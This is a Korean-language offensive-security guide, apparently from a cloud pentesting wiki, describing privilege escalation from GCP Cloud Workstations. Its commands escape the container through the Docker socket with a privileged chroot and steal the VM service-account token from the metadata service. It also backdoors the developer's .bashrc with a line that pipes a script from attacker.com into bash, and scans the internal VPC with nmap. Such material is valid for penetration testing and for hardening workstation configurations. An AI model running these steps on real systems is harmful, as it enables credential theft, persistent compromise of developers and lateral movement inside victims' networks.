# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

Cloud Workstations에서의 주요 권한 상승 경로는 개발자용 **Docker-in-Docker (DinD)** 워크플로를 지원해야 하는 요구사항에서 비롯됩니다. 워크스테이션 설정이 Docker socket을 마운트하거나 privileged containers를 허용하는 경우(일반적인 구성), 워크스테이션 컨테이너 내부의 공격자는 이를 이용해 호스트의 Compute Engine VM으로 container escape를 수행하고 해당 VM의 서비스 계정 토큰을 탈취할 수 있습니다.

**전제 조건:**
- Cloud Workstation 터미널 접근권 (SSH, 탈취된 세션 또는 도용된 자격증명 통해)
- 워크스테이션 구성에서 `/var/run/docker.sock`를 마운트하거나 privileged containers를 활성화해야 함

**아키텍처 컨텍스트:** 워크스테이션은 컨테이너(Layer 3)로서 Docker/Containerd 런타임(Layer 2) 위의 GCE VM(Layer 1)에서 실행됩니다. Docker socket은 호스트의 컨테이너 런타임에 대한 직접 접근을 제공합니다.

> [!NOTE]
> 도구 [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) 는 전체 container escape 과정을 자동화하여 호스트 VM의 root shell로 진입시켜줍니다.

<details>

<summary>Step 1: Check for Docker socket</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Step 2: Escape to the host VM filesystem</summary>

privileged container를 실행하여 호스트의 루트 디렉터리를 `/mnt/host`에 마운트합니다. 가시성을 최대화하기 위해 호스트의 네트워크와 PID namespace도 공유합니다.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
이제 **root shell on the underlying Compute Engine VM** (Layer 1)을 확보했습니다.

</details>

<details>

<summary>3단계: Steal the VM service account token from IMDS</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **권한 범위를 확인하세요!**
> 첨부된 서비스 계정이 **Editor**여도, VM은 액세스 스코프에 의해 제한될 수 있습니다.
> `https://www.googleapis.com/auth/cloud-platform`가 보이면 전체 액세스 권한이 있습니다.
> `logging.write` 및 `monitoring.write`만 보이면, 아래의 **Network Pivot** 및 **Persistence** 벡터로 제한됩니다.

<details>

<summary>단계 4: Achieve Persistence (Backdoor the User)</summary>

Cloud Workstations는 `/home/user`에 영구 디스크를 마운트합니다. 컨테이너 사용자(보통 `user`, UID 1000)가 호스트 사용자(UID 1000)와 일치하므로 호스트의 홈 디렉터리에 쓸 수 있습니다. 이로 인해 workstation container가 재구성되더라도 환경에 backdoor를 설치할 수 있습니다.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>5단계: Network Pivot (Internal VPC Access)</summary>

호스트 네트워크 네임스페이스(`--net=host`)를 공유하고 있으므로 이제 VPC 내의 신뢰된 노드가 됩니다. IP whitelisting을 기반으로 접근을 허용하는 내부 서비스를 scan할 수 있습니다.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
